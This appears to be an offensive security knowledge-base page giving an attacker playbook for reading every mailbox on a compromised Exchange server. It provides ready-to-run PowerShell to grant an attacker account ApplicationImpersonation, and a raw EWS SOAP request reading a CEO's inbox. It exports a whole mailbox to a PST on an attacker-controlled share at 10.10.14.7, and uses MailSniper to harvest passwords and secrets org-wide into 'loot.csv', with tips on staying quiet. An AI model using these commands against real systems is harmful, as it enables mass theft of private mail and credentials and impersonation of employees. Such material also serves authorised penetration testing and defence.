---
title: "Mailbox access: reading and impersonating every mailbox"
description: "Post-credential and post-RCE mailbox access on Exchange: EWS ApplicationImpersonation to read any mailbox, the raw EWS FindItem/GetItem SOAP calls, Exchange Management Shell Get-Mailbox and New-MailboxExportRequest to dump a mailbox to PST, and MailSniper self and global mail search for credentials and intel."
keywords:
  - mailbox access
  - ApplicationImpersonation
  - EWS FindItem
  - New-MailboxExportRequest
  - MailSniper
---

# Mailbox access

Mailboxes hold passwords, reset links, VPN and app secrets, network diagrams, and the standing trust to send mail **as** a real employee. With one credential you read your own mail; with the `ApplicationImpersonation` role or the Exchange Management Shell you read **everyone's**. The access method depends on what you hold: a mailbox credential routes through EWS, an Exchange-admin context or `SYSTEM` on the box routes through the management shell.

## Grant yourself the read: ApplicationImpersonation

The **`ApplicationImpersonation`** RBAC role lets one account act as any mailbox over EWS. From an Exchange admin context (or `SYSTEM` after an [RCE chain](rce-chains/index.md), via the local Exchange Management Shell), assign it to a controlled account:

```powershell
# Exchange Management Shell: give a controlled account org-wide impersonation
New-ManagementRoleAssignment -Name "ar-impersonate" -Role ApplicationImpersonation -User attacker
Get-ManagementRoleAssignment -Role ApplicationImpersonation   # confirm the grant took
```

That account can now authenticate to EWS and set the impersonated identity to any mailbox, with no per-mailbox permission and no password for the victim.

## Read a mailbox over raw EWS

EWS is a SOAP API at `/ews/exchange.asmx`. `FindItem` lists items in a folder, `GetItem` fetches a message body. The `ExchangeImpersonation` SOAP header is what spends the role above, naming the mailbox to act as:

```http
POST /ews/exchange.asmx HTTP/1.1
Host: mail.example.com
Authorization: Basic <base64 attacker creds>
Content-Type: text/xml; charset=utf-8

<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
  xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
  xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages">
  <soap:Header>
    <t:ExchangeImpersonation><t:ConnectingSID>
      <t:PrimarySmtpAddress>ceo@example.com</t:PrimarySmtpAddress>
    </t:ConnectingSID></t:ExchangeImpersonation>
  </soap:Header>
  <soap:Body>
    <m:FindItem Traversal="Shallow">
      <m:ItemShape><t:BaseShape>IdOnly</t:BaseShape></m:ItemShape>
      <m:ParentFolderIds><t:DistinguishedFolderId Id="inbox"/></m:ParentFolderIds>
    </m:FindItem>
  </soap:Body>
</soap:Envelope>
```

A `200` with a `FindItemResponseMessage` listing `ItemId` values confirms the impersonation worked and you are reading the CEO's inbox; take each `ItemId` into a `GetItem` request to pull the body. A `401` means the attacker credential is wrong; a SOAP fault `ErrorImpersonateUserDenied` means the account lacks the role, so revisit the grant above.

## Dump a whole mailbox to PST

From an Exchange-admin or `SYSTEM` context, the management shell exports an entire mailbox to a PST on a share you control, which you then open offline:

```powershell
# Export a target mailbox to a PST on an attacker-reachable UNC path
New-MailboxExportRequest -Mailbox ceo@example.com -FilePath \\10.10.14.7\share\ceo.pst
Get-MailboxExportRequest | Get-MailboxExportRequestStatistics   # watch it reach "Completed"
# enumerate who is worth exporting
Get-Mailbox -ResultSize unlimited | Select Name,PrimarySmtpAddress,Database
```

`New-MailboxExportRequest` requires the `Mailbox Import Export` role, which an Exchange admin can self-assign the same way as above. When the status reads `Completed`, the PST on your share is the full mailbox, offline and searchable.

## Search mail at scale

MailSniper wraps EWS to grep mail for secrets, either your own box or, with impersonation, the entire organization:

```powershell
# Your own mailbox (terms are -like, so wrap in wildcards)
Invoke-SelfSearch -Mailbox john.doe@example.com -Terms "*password*","*vpn*","*secret*","*apikey*"
# Every mailbox, using the ApplicationImpersonation account granted above
Invoke-GlobalMailSearch -ImpersonationAccount attacker -ExchHostname mail.example.com `
  -Terms "*password*","*credential*" -OutputCsv loot.csv
```

`loot.csv` is the hit list: sender, mailbox, subject, and matched snippet. In practice the fastest wins are helpdesk reset mails, service-account passwords, and app secrets sent in cleartext.

## Exploitation notes

- Mail search is routinely the **fastest path to more credentials**: resets, service-account passwords, and app secrets live in cleartext in inboxes.
- `ApplicationImpersonation` over EWS is quieter than `New-MailboxExportRequest`, which writes an export request object and touches a share; prefer EWS read for targeted theft, PST export only when you want the whole box offline.
- Impersonation does not need `SYSTEM` on the server, only the role, so a compromised Exchange admin is enough; conversely, after an RCE chain the local management shell runs effectively unrestricted.
- Holding a mailbox also enables sending **as** a trusted internal user and planting client-side [Outlook abuse](outlook-client-abuse.md) and server-side [mail-flow persistence](mail-flow-persistence.md).

## Tools

- **MailSniper** (`Invoke-SelfSearch`, `Invoke-GlobalMailSearch`, `Get-GlobalAddressList`): EWS mail search and impersonation.
- **Exchange Management Shell** (`New-ManagementRoleAssignment`, `New-MailboxExportRequest`, `Get-Mailbox`): role grants and PST export.
- **impacket / exchangelib / ruler**: scripted EWS and MAPI mailbox operations.

## References

- [MailSniper (dafthack)](https://github.com/dafthack/MailSniper)
- [Microsoft: Impersonation and EWS in Exchange](https://learn.microsoft.com/en-us/exchange/client-developer/exchange-web-services/impersonation-and-ews-in-exchange)
- [Microsoft: New-MailboxExportRequest](https://learn.microsoft.com/en-us/powershell/module/exchange/new-mailboxexportrequest)
- [Black Hills InfoSec: attacking Exchange with MailSniper](https://www.blackhillsinfosec.com/attacking-exchange-with-mailsniper/)
